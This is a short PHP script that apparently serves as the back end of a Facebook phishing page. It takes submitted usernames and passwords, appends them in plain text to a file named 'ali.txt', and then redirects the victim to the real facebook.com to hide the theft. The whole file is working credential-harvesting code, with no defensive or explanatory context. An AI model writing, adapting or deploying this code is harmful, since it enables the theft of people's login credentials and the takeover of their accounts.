<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $data = "Username: $username\nPassword: $password\n";
    file_put_contents("ali.txt", $data, FILE_APPEND);
    header("Location: https://www.facebook.com"); // Redirect to Facebook after saving data
    exit;
}
?>
